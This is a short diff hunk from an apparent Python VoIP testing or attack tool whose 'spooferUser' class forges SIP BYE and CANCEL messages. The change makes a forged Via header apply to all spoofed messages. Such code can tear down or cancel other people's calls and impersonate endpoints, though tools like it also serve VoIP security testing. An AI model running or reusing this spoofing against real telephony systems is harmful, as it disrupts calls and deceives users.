@@ -155,11 +155,11 @@ class spooferUser(User):
 			self.remoteParty = rfc3261_IPv6.Address(str(message.To.value.uri))
 			self.remoteParty.uri.port = self.app.options.port
 			# Spoof BYE message
-			if self.spoof_mode == 'spfBYE':
-				message = _createBYE(message,B_host)
-				if B_host: message['Via'] = rfc3261_IPv6.Header('SIP/2.0/UDP '+str(message.To.value.uri.host)+(':'+str(message.To.value.uri.port) if (message.To.value.uri.port) else '')+';branch='+('z9hG4bK' + str(urlsafe_b64encode(md5('All That is Gold Does Not Glitter').digest())).replace('=','.'))+';rport', 'Via')
+			if self.spoof_mode == 'spfBYE': message = _createBYE(message,B_host)
 			# Spoof CANCEL message
 			if self.spoof_mode == 'spfCANCEL': message = _createCANCEL(message)
+			# Spoof Via
+			message['Via'] = rfc3261_IPv6.Header('SIP/2.0/UDP '+str(message.From.value.uri.host)+(':'+str(message.From.value.uri.port) if (message.From.value.uri.port) else '')+';branch='+('z9hG4bK' + str(urlsafe_b64encode(md5('All That is Gold Does Not Glitter').digest())).replace('=','.'))+';rport', 'Via')
 		# Manual Spoofs ---------
 		else:
 			# Spoofs ---------
